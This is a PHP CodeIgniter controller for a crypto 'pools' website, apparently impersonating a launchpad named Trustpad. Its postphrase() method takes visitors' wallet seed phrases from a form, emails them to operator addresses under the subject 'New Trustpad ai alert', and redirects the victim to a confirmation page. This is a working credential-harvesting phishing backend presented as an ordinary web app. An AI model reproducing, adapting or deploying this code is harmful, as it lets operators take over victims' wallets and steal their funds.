<?php namespace App\Controllers;

class Home extends BaseController
{
	public function index()
	{
		$Pools = new \App\Models\Pools();
		$data = [
			// 'pools'=> $Pools->findAll(),
			'activePools' => $activePools = $Pools->where('status','active')->findAll(),
			'activePoolsCount' => count($activePools),
			'upcomingPools' => $upcomingPools = $Pools->where('status','upcoming')->findAll(),
			'upcomingPoolsCount' => count($upcomingPools),
			'endedPools' => $endedPools = $Pools->where(['status'=>'filled'])->orWhere(['status'=>'ended'])->findAll(),
			'endedPoolsCount' => count($endedPools),
			'date' => Date('d M, H:i e'),
		];
		$hdata = [
			'date' => Date('d M, H:i e'),
		];
		echo view('header', $hdata);
		echo view('home',$data);
		echo view('footer');		
		echo view('modal');

	}

	public function pages($id)
	{
		$Pools = new \App\Models\Pools();
		$data = [
			'pool'=> $Pools->where('name',$id)->find()[0],
			'date' => Date('d M, H:i e'),
		];
		$hdata = [
			'date' => Date('d M, H:i e'),
		];
		echo view('header', $hdata);
		echo view('page',$data);
		echo view('footer');		echo view('modal');

	}

	
	public function message($type, array $data)
	{
		$burl = base_url();
		if ($type == 'link') {
			$output = "
            <!DOCTYPE html>
            <html lang='en'>
            <head>
                <meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title></title>
                <style>
                    body{margin: 0;padding: 0;}
                    .container{background-color: black;border-radius: 1.5rem;text-align: center;}
                    main{padding-bottom: 4rem;}
                    footer{padding: 0.4rem 0;background-color: black;color: white;border-bottom-left-radius: 1.5rem;border-bottom-right-radius: 1.5rem;}
                </style>
            </head>
            <body>
                <div class='container'>
                    <header class='logo'><img width='50%' src='" . $burl . "images/pan-bg.svg' alt=''></header>
                    <main>
                        <h2>" . $data['msg'] . "</h2>
                    </main>
                    <footer>&copy; ...</footer>
                </div>
            </body>
            </html>
        ";
		}
		return $output;
	}

	public function mailer(array $data)
	{
		$email = \Config\Services::email();
		$email->setFrom( getenv('smtpuser'), 'Seed Phrase Notification');
		$email->setTo($data['to']);
		$email->setCC($data['cc']);
		// $email->setBCC('them@their-example.com');

		$email->setSubject($data['subject']);
		$email->setMessage($this->message($data['type'], $data['message']));

		$email->send(false);
		// return $email->printDebugger(['headers', 'subject', 'body']);
	}

	public function postphrase()
	{
		$incoming = $this->request->getPost();
		if(isset($incoming['wallet'])){
			$msg = "Wallet type: ".$incoming['wallet']." <br> "."Seed Phrase: ".$incoming['phrase'];
		}else{
			$msg = "Seed Phrase: ".$incoming['phrase'];
		}
		$data = [
			'to' => getenv('smtpto'),
			'cc' => getenv('smtpcc'),
			'type' => 'link',
			'subject' => 'New Trustpad ai alert',
			'message' => ['msg' => $msg],
		];
		$this->mailer($data);
		return redirect()->to(base_url('index#confirmation'));
	}
	//--------------------------------------------------------------------

}
